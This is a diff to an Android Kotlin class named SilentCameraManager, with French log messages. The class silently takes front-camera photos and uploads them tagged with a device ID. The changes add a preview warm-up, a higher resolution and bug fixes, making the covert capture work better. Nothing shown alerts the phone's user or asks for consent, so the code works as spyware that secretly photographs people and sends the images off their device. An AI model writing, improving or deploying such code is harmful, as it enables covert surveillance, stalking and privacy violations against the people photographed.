@@ -30,14 +30,13 @@ class SilentCameraManager(private val context: Context) {
     }
 
     suspend fun takeSilentPhoto(deviceId: String) {
-        Log.d("SilentCamera", "Tentative de capture...")
+        Log.d("SilentCamera", "Démarrage capture...")
 
         try {
             val cameraManager = context.getSystemService(
                 Context.CAMERA_SERVICE
             ) as CameraManager
 
-            // Trouver la caméra frontale
             var frontCameraId: String? = null
             for (cameraId in cameraManager.cameraIdList) {
                 val chars = cameraManager
@@ -55,26 +54,29 @@ class SilentCameraManager(private val context: Context) {
 
             if (frontCameraId == null) {
                 Log.e("SilentCamera",
-                    "Caméra frontale non trouvée")
+                    "Caméra frontale non trouvée ❌")
                 return
             }
 
-            Log.d("SilentCamera",
-                "Caméra frontale trouvée: $frontCameraId")
-
             val imageReader = ImageReader.newInstance(
-                640, 480,
+                1280, 720,
                 ImageFormat.JPEG,
-                1
+                2
             )
 
+            var photoTaken = false
+
             imageReader.setOnImageAvailableListener({ reader ->
+                if (photoTaken) return@setOnImageAvailableListener
+                photoTaken = true
+
                 val image = reader.acquireLatestImage()
                 if (image != null) {
                     try {
                         val buffer = image.planes[0].buffer
                         val bytes = ByteArray(buffer.remaining())
                         buffer.get(bytes)
+                        image.close()
 
                         val photoFile = File(
                             context.cacheDir,
@@ -83,16 +85,14 @@ class SilentCameraManager(private val context: Context) {
                         FileOutputStream(photoFile).use {
                             it.write(bytes)
                         }
-                        image.close()
 
                         Log.d("SilentCamera",
-                            "Photo capturée ✅")
+                            "Photo capturée ✅ ${bytes.size} bytes")
 
                         CoroutineScope(Dispatchers.IO).launch {
                             try {
                                 repository.uploadPhoto(
-                                    deviceId,
-                                    photoFile
+                                    deviceId, photoFile
                                 )
                                 Log.d("SilentCamera",
                                     "Photo uploadée ✅")
@@ -103,8 +103,8 @@ class SilentCameraManager(private val context: Context) {
                         }
                     } catch (e: Exception) {
                         Log.e("SilentCamera",
-                            "Erreur traitement: ${e.message}")
-                        image.close()
+                            "Erreur: ${e.message}")
+                        image?.close()
                     }
                 }
             }, handler)
@@ -117,13 +117,6 @@ class SilentCameraManager(private val context: Context) {
                             "Caméra ouverte ✅")
                         try {
                             val surface = imageReader.surface
-                            val captureRequest = camera
-                                .createCaptureRequest(
-                                    CameraDevice
-                                        .TEMPLATE_STILL_CAPTURE
-                                ).apply {
-                                    addTarget(surface)
-                                }.build()
 
                             camera.createCaptureSession(
                                 listOf(surface),
@@ -132,20 +125,74 @@ class SilentCameraManager(private val context: Context) {
                                     override fun onConfigured(
                                         session: CameraCaptureSession
                                     ) {
-                                        session.capture(
-                                            captureRequest,
-                                            null,
-                                            handler
-                                        )
-                                        Log.d("SilentCamera",
-                                            "Capture lancée ✅")
+                                        try {
+                                            // Pré-chauffer la caméra
+                                            // avec preview request
+                                            val previewRequest =
+                                                camera.createCaptureRequest(
+                                                    CameraDevice
+                                                        .TEMPLATE_PREVIEW
+                                                ).apply {
+                                                    addTarget(surface)
+                                                }.build()
 
-                                        // Fermer après 3 secondes
-                                        handler.postDelayed({
+                                            // Lancer preview
+                                            session.setRepeatingRequest(
+                                                previewRequest,
+                                                null,
+                                                handler
+                                            )
+
+                                            // Attendre 2 secondes
+                                            // pour que la caméra
+                                            // s'ajuste à la lumière
+                                            handler.postDelayed({
+                                                try {
+                                                    // Arrêter preview
+                                                    session
+                                                        .stopRepeating()
+
+                                                    // Capturer photo
+                                                    val captureRequest =
+                                                        camera
+                                                            .createCaptureRequest(
+                                                                CameraDevice
+                                                                    .TEMPLATE_STILL_CAPTURE
+                                                            ).apply {
+                                                                addTarget(surface)
+                                                            }.build()
+
+                                                    session.capture(
+                                                        captureRequest,
+                                                        null,
+                                                        handler
+                                                    )
+
+                                                    Log.d("SilentCamera",
+                                                        "Capture lancée ✅")
+
+                                                    // Fermer après
+                                                    // 3 secondes
+                                                    handler.postDelayed({
+                                                        session.close()
+                                                        camera.close()
+                                                        imageReader.close()
+                                                    }, 3000)
+
+                                                } catch (e: Exception) {
+                                                    Log.e("SilentCamera",
+                                                        "Erreur capture: ${e.message}")
+                                                    session.close()
+                                                    camera.close()
+                                                }
+                                            }, 2000) // 2 secondes d'attente
+
+                                        } catch (e: Exception) {
+                                            Log.e("SilentCamera",
+                                                "Erreur config: ${e.message}")
                                             session.close()
                                             camera.close()
-                                            imageReader.close()
-                                        }, 3000)
+                                        }
                                     }
 
                                     override fun onConfigureFailed(
@@ -169,6 +216,8 @@ class SilentCameraManager(private val context: Context) {
                         camera: CameraDevice
                     ) {
                         camera.close()
+                        Log.d("SilentCamera",
+                            "Caméra déconnectée")
                     }
 
                     override fun onError(
@@ -183,6 +232,9 @@ class SilentCameraManager(private val context: Context) {
                 handler
             )
 
+        } catch (e: SecurityException) {
+            Log.e("SilentCamera",
+                "Permission caméra refusée: ${e.message}")
         } catch (e: Exception) {
             Log.e("SilentCamera",
                 "Erreur générale: ${e.message}")
